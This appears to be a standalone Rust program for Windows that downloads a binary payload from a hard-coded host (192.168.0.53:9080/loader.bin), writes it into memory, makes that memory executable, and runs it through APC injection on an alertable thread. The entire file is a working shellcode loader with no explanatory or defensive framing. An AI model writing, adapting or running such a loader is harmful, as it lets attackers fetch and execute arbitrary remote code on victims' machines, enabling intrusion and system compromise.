use std::{
    ffi::c_void,
    process::exit,
    ptr::{copy, null, null_mut},
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, QueueUserAPC, ResumeThread, SleepEx, WaitForSingleObject, INFINITE,
    THREAD_CREATION_FLAGS,
};

#[tokio::main]
async fn main(){
    
    let url = "http://192.168.0.53:9080/loader.bin";
    let response = reqwest::get(url).await.expect("Falha ao fazer a requisição");
    let buf: Vec<u8> = response.bytes().await.expect("Falha ao ler os bytes").to_vec();
    unsafe {
        let hthread = CreateThread(
            Some(null()),
            0,
            Some(function),
            Some(null()),
            THREAD_CREATION_FLAGS(0),
            Some(null_mut()),
        )
        .unwrap_or_else(|e| {
            eprintln!("[!] CreateThread Failed With Error: {e}");
            exit(-1)
        });

        let address = VirtualAlloc(
            Some(null()),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        copy(buf.as_ptr() as _, address, buf.len());

        let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(address, buf.len(), PAGE_EXECUTE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
            panic!("[!] VirtualProtect Failed With Error: {e}");
        });

        QueueUserAPC(Some(std::mem::transmute(address)), hthread, 0);

        ResumeThread(hthread);

        WaitForSingleObject(hthread, INFINITE);
    }
}

unsafe extern "system" fn function(_param: *mut c_void) -> u32 {
    SleepEx(INFINITE, true);

    return 0;
} 
